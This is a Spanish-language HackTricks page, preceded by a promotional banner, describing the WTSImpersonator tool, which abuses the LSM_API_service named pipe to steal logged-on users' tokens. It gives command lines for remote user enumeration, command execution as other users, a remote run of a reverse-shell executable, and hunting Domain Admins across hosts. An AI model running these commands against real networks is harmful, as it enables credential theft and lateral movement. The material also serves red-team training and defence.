<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

El **WTS Impersonator** es una herramienta que explota el Named pipe RPC **"\\pipe\LSM_API_service"** para enumerar sigilosamente usuarios conectados y secuestrar sus tokens, evitando las técnicas tradicionales de suplantación de token. Este enfoque facilita movimientos laterales sin problemas dentro de las redes. La innovación detrás de esta técnica se atribuye a **Omri Baso, cuyo trabajo está disponible en [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidad Principal
La herramienta opera a través de una secuencia de llamadas a API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Clave y Uso
- **Enumeración de Usuarios**: La enumeración de usuarios locales y remotos es posible con la herramienta, utilizando comandos para cada escenario:
  - Localmente:
  ```powershell
  .\WTSImpersonator.exe -m enum
  ```
  - Remotamente, especificando una dirección IP o nombre de host:
  ```powershell
  .\WTSImpersonator.exe -m enum -s 192.168.40.131
  ```

- **Ejecución de Comandos**: Los módulos `exec` y `exec-remote` requieren un contexto de **Servicio** para funcionar. La ejecución local simplemente necesita el ejecutable WTSImpersonator y un comando:
  - Ejemplo de ejecución de comando local:
  ```powershell
  .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
  ```
  - PsExec64.exe se puede utilizar para obtener un contexto de servicio:
  ```powershell
  .\PsExec64.exe -accepteula -s cmd.exe
  ```

- **Ejecución de Comandos Remotos**: Implica crear e instalar un servicio de forma remota similar a PsExec.exe, permitiendo la ejecución con los permisos adecuados.
  - Ejemplo de ejecución remota:
  ```powershell
  .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
  ```

- **Módulo de Caza de Usuarios**: Apunta a usuarios específicos en múltiples máquinas, ejecutando código bajo sus credenciales. Esto es especialmente útil para apuntar a Administradores de Dominio con derechos de administrador local en varios sistemas.
  - Ejemplo de uso:
  ```powershell
  .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
  ```
